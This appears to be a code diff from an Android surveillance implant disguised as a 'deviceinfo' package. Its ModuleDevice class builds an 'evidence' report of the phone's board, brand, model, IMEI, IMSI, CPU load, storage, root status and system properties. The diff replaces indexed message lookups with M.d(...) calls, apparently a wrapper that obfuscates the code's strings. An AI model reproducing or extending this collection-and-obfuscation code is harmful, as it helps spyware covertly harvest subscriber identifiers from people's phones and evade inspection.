@@ -24,7 +24,6 @@ import android.os.Environment;
 import android.os.StatFs;
 
 import com.android.deviceinfo.Device;
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -32,6 +31,7 @@ import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 /**
  * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
@@ -104,24 +104,24 @@ public class ModuleDevice extends BaseInstantModule {
 		}
 
 		// SYSTEM
-		sb.append(Messages.getString("9_3") + "\n"); //$NON-NLS-1$
-		sb.append(Messages.getString("9_22") + Build.BOARD + "\n");
-		sb.append(Messages.getString("9_23") + Build.BRAND + "\n");
-		sb.append(Messages.getString("9_24") + Build.DEVICE + "\n");
-		sb.append(Messages.getString("9_25") + Build.MODEL + "\n");
-		sb.append(Messages.getString("9_26") + Build.DISPLAY + "\n");
+		sb.append(M.d("-- SYSTEM --") + "\n"); //$NON-NLS-1$
+		sb.append(M.d("Board: ") + Build.BOARD + "\n");
+		sb.append(M.d("Brand: ") + Build.BRAND + "\n");
+		sb.append(M.d("Device: ") + Build.DEVICE + "\n");
+		sb.append(M.d("Display: ") + Build.MODEL + "\n");
+		sb.append(M.d("Model:") + Build.DISPLAY + "\n");
 
-		sb.append(Messages.getString("9_4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.d("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append(Messages.getString("9_6") + "\n"); //$NON-NLS-1$
+			sb.append(M.d("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
 		} else {
-			sb.append(Messages.getString("9_7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		sb.append(Messages.getString("9_9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(Messages.getString("9_11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(Messages.getString("9_13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.d("cpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.d("cpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.d("cpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
 		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
@@ -135,13 +135,13 @@ public class ModuleDevice extends BaseInstantModule {
 
 		if (Cfg.DEBUG) {
 			if (Status.self().haveRoot()) {
-				sb.append(Messages.getString("9_15") + "\n"); //$NON-NLS-1$
+				sb.append(M.d("root: yes") + "\n"); //$NON-NLS-1$
 			} else {
-				sb.append(Messages.getString("9_16") + "\n"); //$NON-NLS-1$
+				sb.append(M.d("root: no") + "\n"); //$NON-NLS-1$
 			}
 		}
 
-		sb.append(Messages.getString("9_17") + "\n"); //$NON-NLS-1$
+		sb.append(M.d("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
@@ -177,7 +177,7 @@ public class ModuleDevice extends BaseInstantModule {
 	private void readCpuUsage() {
 		try {
 			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
-					Messages.getString("9_21"))), //$NON-NLS-1$
+					M.d("/proc/stat"))), //$NON-NLS-1$
 					1000);
 			final String load = reader.readLine();
 			reader.close();
